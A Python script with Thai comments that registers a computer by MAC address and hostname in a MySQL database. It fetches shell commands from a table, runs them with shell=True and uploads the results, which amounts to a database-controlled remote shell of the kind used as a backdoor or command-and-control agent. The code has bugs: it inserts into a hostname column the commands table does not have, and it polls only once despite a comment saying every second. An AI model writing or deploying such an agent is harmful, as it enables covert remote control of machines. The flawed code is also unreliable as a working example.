import mysql.connector
import subprocess
import time
import socket
import uuid
import re

# ฟังก์ชันสำหรับการเชื่อมต่อฐานข้อมูล MySQL
def connect_to_db():
    return mysql.connector.connect(
        host="", 
        user="", 
        password="", 
        database=""
    )

# ฟังก์ชันสำหรับดึง Mac Address
def get_mac_address():
    mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))  # ดึงค่า Mac Address
    return mac

# ฟังก์ชันสำหรับการสร้างตาราง RandomID และ commands
def create_tables(cursor):
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS RandomID (
            id INT AUTO_INCREMENT PRIMARY KEY,
            random_id VARCHAR(50) NOT NULL,
            command_text VARCHAR(255) NOT NULL,
            hostname VARCHAR(100),
            UNIQUE(random_id)
        )
    """)
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS commands (
            id INT AUTO_INCREMENT PRIMARY KEY,
            command_text VARCHAR(255),
            result TEXT
        )
    """)
    print("Tables 'RandomID' and 'commands' created or already exist.")

# ฟังก์ชันสำหรับการอินเสิร์ตข้อมูลครั้งแรก
def insert_initial_command(cursor):
    hostname = get_hostname()
    mac_address = get_mac_address()
    command_text = "---"  # ตั้งค่าเริ่มต้นเป็น '---'

    # ตรวจสอบว่ามี Mac Address อยู่ในตารางแล้วหรือไม่
    query_check = "SELECT random_id FROM RandomID WHERE random_id = %s"
    cursor.execute(query_check, (mac_address,))
    existing_entry = cursor.fetchone()

    if existing_entry:
        print(f"Mac Address {mac_address} already exists.")
    else:
        print(f"Inserting new Mac Address {mac_address}.")
        query_insert = "INSERT INTO RandomID (random_id, command_text, hostname) VALUES (%s, %s, %s)"
        cursor.execute(query_insert, (mac_address, command_text, hostname))

    return mac_address

# ฟังก์ชันสำหรับการดึง Hostname ของคอมพิวเตอร์
def get_hostname():
    return socket.gethostname()

# ฟังก์ชันสำหรับอัปเดตผลลัพธ์และแทรกข้อมูลลงในตาราง commands
def update_command_result(cursor, mac_address, command_text, result):
    hostname = get_hostname()
    query = "INSERT INTO commands (command_text, result, hostname) VALUES (%s, %s, %s)"
    cursor.execute(query, (command_text, result, hostname))

    query = "UPDATE RandomID SET command_text = '---' WHERE random_id = %s"
    cursor.execute(query, (mac_address,))

# ฟังก์ชันสำหรับตรวจสอบคำสั่งใหม่จากตาราง RandomID โดยอิงตาม mac_address
# ฟังก์ชันสำหรับตรวจสอบคำสั่งใหม่จากตาราง RandomID โดยอิงตาม mac_address
def loop(cursor, mac_address):
    query = "SELECT command_text FROM RandomID WHERE random_id = %s AND command_text !='---' "
    cursor.execute(query, (mac_address,))
    command_data = cursor.fetchone()

    if command_data:
        command_text = command_data[0]
        print(f"Processing command: {command_text}")

        try:
            # เรียกใช้คำสั่ง
            result = subprocess.run(command_text, shell=True, capture_output=True, text=True)
            
            # ตรวจสอบว่าเกิดข้อผิดพลาดหรือไม่
            if result.returncode != 0:  # ถ้า return code ไม่ใช่ 0 หมายถึงมีข้อผิดพลาด
                output = f"Error: {result.stderr.strip()}"  # ใช้ค่า stderr แทน
            else:
                output = result.stdout.strip()  # ใช้ค่า stdout ถ้าไม่มีข้อผิดพลาด

            # อัปเดตผลลัพธ์
            update_command_result(cursor, mac_address, command_text, output)
            print(f"Command executed. Result: {output}")

        except Exception as e:
            # ถ้ามีข้อผิดพลาดในกระบวนการรันคำสั่ง
            output = f"Error: {str(e)}"
            update_command_result(cursor, mac_address, command_text, output)
            print(f"Failed to execute command. Error: {output}")

    else:
        print("No new commands found. Waiting for new command...")

# ฟังก์ชันหลักสำหรับประมวลผลคำสั่ง
def process_commands():
    db_connection = connect_to_db()
    cursor = db_connection.cursor()

    create_tables(cursor)

    mac_address = insert_initial_command(cursor)
    db_connection.commit()
    print(f"Mac Address {mac_address} created for computer: {get_hostname()}")
    loop(cursor, mac_address)
    db_connection.commit()  # บันทึกข้อมูลทุกครั้งหลังจากเรียกใช้งานคำสั่ง
# ตรวจสอบคำสั่งใหม่ทุกๆ 1 วินาที

    cursor.close()
    db_connection.close()

if __name__ == "__main__":
    process_commands()
